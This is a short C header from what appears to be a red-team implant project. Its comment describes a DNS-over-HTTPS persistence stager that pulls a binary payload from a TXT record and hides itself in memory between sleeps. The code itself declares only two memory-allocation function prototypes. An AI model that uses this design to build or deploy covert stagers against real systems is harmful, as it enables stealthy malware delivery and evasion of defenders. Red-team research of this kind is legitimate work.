/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _NTMEM_H_
#define _NTMEM_H_

D_SEC(B) PVOID NtMemAlloc( PINSTANCE Ins, ULONG Len );

D_SEC(B) BOOL NtMemFree( PINSTANCE Ins, PVOID Ptr );

#endif
